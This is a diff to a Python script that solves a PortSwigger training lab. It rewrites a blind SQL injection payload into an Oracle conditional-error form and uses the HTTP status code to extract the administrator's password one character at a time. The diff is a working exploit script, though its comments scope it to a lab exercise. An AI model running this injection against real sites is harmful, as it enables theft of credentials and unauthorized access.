@@ -1,8 +1,8 @@
 import requests
-from bs4 import BeautifulSoup
+#from bs4 import BeautifulSoup
 
 #This script is for finding the password in the following portswigger web security lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
-#It's already determined that the password is 20 characters long and alphanumeric through previous injection
+#It's already determined that the password is 20 characters long and alphanumeric through previous injection, note this is Oracle SQL
 #This is also possible on community burp suite but it takes hours due to the number of combinations, recommend doing with pro edition
 
 def get_server_details():
@@ -22,7 +22,8 @@ def tracking_id_inject(payload1, payload2):
     host = url.lstrip("https://")
     host = host.rstrip("/")
 
-    injection = "\'and substring((select password from users where username = \'administrator\')," + payload1 + ",1) " + payload2
+    #payload1 is for indexing the password, payload 2 is for checking sql error
+    injection = "select case when (substr((select password from users where username = \'administrator\')," + payload1 + ",1)" + payload2 + ") then to_char(1/0) else \'1\' end from dual)=\'1"
     
     headers = {
         'Host': host,
@@ -43,14 +44,14 @@ def tracking_id_inject(payload1, payload2):
         'Priority': 'u=0, i'
     }
     response = requests.get(url, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
+    #soup = BeautifulSoup(response.text, 'html.parser')
     #print(soup)
-    if soup.find(string="Welcome back!"):
-        print("True")
-        return True
-    else:
+    if response.status_code == 200:
         print("False")
         return False
+    else:
+        print("True")
+        return True
         
 #find specific character for each of the 20 characters
 def find_password_char():
